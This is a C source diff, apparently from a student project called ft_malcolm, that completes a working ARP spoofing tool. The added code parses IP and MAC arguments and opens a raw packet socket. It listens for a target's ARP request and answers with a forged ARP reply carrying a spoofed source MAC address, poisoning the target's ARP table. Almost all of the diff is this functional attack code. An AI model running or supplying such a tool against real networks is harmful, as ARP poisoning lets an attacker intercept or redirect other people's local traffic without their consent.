@@ -1,5 +1,16 @@
 #include "header.h"
 
+static t_data *g_data = NULL;
+
+static void signal_handler(int sig)
+{
+	(void)sig;
+	if (g_data && g_data->sockfd > 0)
+		close(g_data->sockfd);
+	printf("Exiting program...\n");
+	exit(0);
+}
+
 int	ft_strlen(const char *str)
 {
 	int	i;
@@ -17,64 +28,69 @@ int	ft_tolower(int character)
 	return (character);
 }
 
-int verify_ip_adress(const char *str) // str is ip address src or targ
+int verify_ip_adress(const char *str, uint8_t *addr) // str is ip address src or targ
 {
-    struct in_addr addr;
-    if (inet_pton(AF_INET, str, &addr) != 1) // inet_pton rempli la struct addr 
+
+    if (inet_pton(AF_INET, str, addr) != 1) // inet_pton rempli la struct addr 
         return 1;
     // printf("Ip %s is valid", str);
     return 0;
 }
 
 
-int verify_mac_adress(const char *mac_addr)
+int verify_mac_adress(const char *mac_addr, uint8_t *mac)
 {
-    int idx;
-    char hexa[]  = "0123456789abcdef";
+	int idx;
+	char hexa[] = "0123456789abcdef";
 
-    idx = 0;
-    if (ft_strlen(mac_addr) != 17)
-       return 1;
-    while (idx < 17)
-    {
-        if ((idx + 1) % 3 == 0 && idx + 1 != '\0')
-        {
-            if (mac_addr[idx] != ':')
-                return 1;
-        }
-        else
-        {
-            char c = ft_tolower(mac_addr[idx]);
-            int j = -1;
-            int found = 0;
-            while (hexa[++j])
-            {
-                if (c == hexa[j])
-                {
-                    found = 1;
-                    break;
-                }
-            }
-            if (!found)
-                return 1;
-        }
-        idx++;
-    }
-    return 0;
+	idx = 0;
+	if (ft_strlen(mac_addr) != 17)
+		return 1;
+	while (idx < 17)
+	{
+		if ((idx + 1) % 3 == 0 && idx + 1 != '\0')
+		{
+			if (mac_addr[idx] != ':')
+				return 1;
+		}
+		else
+		{
+			char c = ft_tolower(mac_addr[idx]);
+			int j = -1;
+			int found = 0;
+
+			while (hexa[++j])
+			{
+				if (c == hexa[j])
+				{
+					found = 1;
+					if (idx % 3 == 0)
+						mac[idx / 3] = j * 16;
+					else
+						mac[idx / 3] += j;
+					break;
+				}
+			}
+			if (!found)
+				return 1;
+		}
+		idx++;
+	}
+	return 0;
 }
 
 int parse_args(int argc, char **argv)
 {
     if (argc != 5)
-       return (printf("Usage: \n./ft_malcom <src ip> <src mac address> <target ip> <target mac address>\n"), 1);
-    else if (verify_ip_adress(argv[1]) == 1)
-        return (printf("ft_malcolm: unknown host or invalid IP address: (%s)", argv[1]), 1);
-    else if (verify_ip_adress(argv[3]) == 1)
-        return (printf("ft_malcolm: unknown host or invalid IP address: %s", argv[3]), 1);
-    else if (verify_mac_adress(argv[2]) == 1)
-        return (printf("ft_malcolm: invalid mac address: (%s)", argv[2]), 1);
-    else if (verify_mac_adress(argv[4]) == 1)
-        return (printf("ft_malcolm: invalid mac address: (%s)", argv[4]), 1);
+       return (printf("Usage: \n./ft_malcolm <src ip> <src mac address> <target ip> <target mac address>\n"), 1);
+    else if (verify_ip_adress(argv[1], g_data->src_ip) == 1)
+        return (printf("ft_malcolm: unknown host or invalid IP address: (%s)\n", argv[1]), 1);
+    else if (verify_ip_adress(argv[3], g_data->tgt_ip) == 1)
+        return (printf("ft_malcolm: unknown host or invalid IP address: (%s)\n", argv[3]), 1);
+    else if (verify_mac_adress(argv[2], g_data->src_mac.bytes) == 1)
+        return (printf("ft_malcolm: invalid mac address: (%s)\n", argv[2]), 1);
+    else if (verify_mac_adress(argv[4], g_data->tgt_mac.bytes) == 1)
+        return (printf("ft_malcolm: invalid mac address: (%s)\n", argv[4]), 1);
     return 0;
 }
 
@@ -101,27 +117,27 @@ int forge_arp_rep(t_arp_frame *frame, t_data *data)
     return (sizeof(t_arp_frame));
 }
 
-// static int send_arp_reply(t_data *data)
-// {
-//     t_arp_frame frame;
-//     struct sockaddr_ll  sa;
-//     int                 len;
+static int send_arp_reply(t_data *data)
+{
+    t_arp_frame frame;
+    struct sockaddr_ll  sa;
+    int                 len;
 
-//     len = forge_arp_rep(&frame, data);
-//     memset(&sa, 0, sizeof(sa));
-//     sa.sll_family   = AF_PACKET;
-//     sa.sll_ifindex  = data->ifaceIdx;
-//     sa.sll_halen    = 6;
-//     memcpy(sa.sll_addr, data->tgt_mac.bytes, 6);
+    len = forge_arp_rep(&frame, data);
+    memset(&sa, 0, sizeof(sa));
+    sa.sll_family   = AF_PACKET;
+    sa.sll_ifindex  = data->ifaceIdx;
+    sa.sll_halen    = 6;
+    memcpy(sa.sll_addr, data->tgt_mac.bytes, 6);
 
-//     printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
-//     if (sendto(data->sockfd, &frame, len, 0,
-//                (struct sockaddr *)&sa, sizeof(sa)) < 0) {
-//         return -1;
-//     }
-//     printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
-//     return 0;
-// }
+    printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
+    if (sendto(data->sockfd, &frame, len, 0,
+               (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+        return -1;
+    }
+    printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
+    return 0;
+}
 
 int find_interface(const char *target_ip_str, t_data *data)
 {
@@ -161,15 +177,73 @@ int find_interface(const char *target_ip_str, t_data *data)
     return -1;
 }
 
+int create_raw_socket(t_data *data)
+{
+    data->sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+    if (data->sockfd < 0) {
+        perror("ft_malcolm: failed to create raw socket");
+        return -1;
+    }
+    return 0;
+}
+
+int wait_for_arp_request(t_data *data)
+{
+	uint8_t buf[65536];
+	struct sockaddr saddr;
+	socklen_t saddr_len = sizeof(saddr);
+
+	printf("Waiting for ARP request for target IP...\n");
+	while (1) {
+		ssize_t n = recvfrom(data->sockfd, buf, sizeof(buf), 0, &saddr, &saddr_len);
+		if (n < 0) {
+			perror("ft_malcolm: recvfrom failed");
+			close(data->sockfd);
+			return -1;
+		}
+		if (n >= (ssize_t)sizeof(t_arp_frame)) {
+			t_arp_frame *frame = (t_arp_frame *)buf;
+			if (ntohs(frame->ether.h_proto) == ETH_P_ARP &&
+				ntohs(frame->arp.ar_op) == ARPOP_REQUEST &&
+				memcmp(frame->sender_ip, data->tgt_ip, 4) == 0 &&
+				memcmp(frame->target_ip, data->src_ip, 4) == 0) {
+				printf("An ARP request has been broadcast.\n");
+				printf("mac address of request: %02x:%02x:%02x:%02x:%02x:%02x\n",
+					frame->sender_mac[0], frame->sender_mac[1], frame->sender_mac[2],
+					frame->sender_mac[3], frame->sender_mac[4], frame->sender_mac[5]);
+				printf("IP address of request: %u.%u.%u.%u\n",
+					frame->sender_ip[0], frame->sender_ip[1],
+					frame->sender_ip[2], frame->sender_ip[3]);
+				if (send_arp_reply(data) < 0)
+					return -1;
+				printf("Exiting program...\n");
+				return 0;
+			}
+		}
+	}
+	return 0;
+}
+
 int main(int argc, char **argv)
 {
-    t_data data;
+	t_data data;
+	struct sigaction sa;
 
-    memset(&data, 0, sizeof(data));
+	memset(&data, 0, sizeof(data));
+	g_data = &data;
 
-    if (parse_args(argc, argv) == 1)
-        return 1;
-    if (find_interface(argv[3], &data) < 0)
-        return 1;
-    return 0;
+	memset(&sa, 0, sizeof(sa));
+	sa.sa_handler = signal_handler;
+	sigaction(SIGINT, &sa, NULL);
+
+	if (parse_args(argc, argv) == 1)
+		return 1;
+	if (find_interface(argv[3], &data) < 0)
+		return 1;
+	if (create_raw_socket(&data) < 0)
+		return 1;
+	if (wait_for_arp_request(&data) < 0)
+		return 1;
+	close(data.sockfd);
+	return 0;
 }
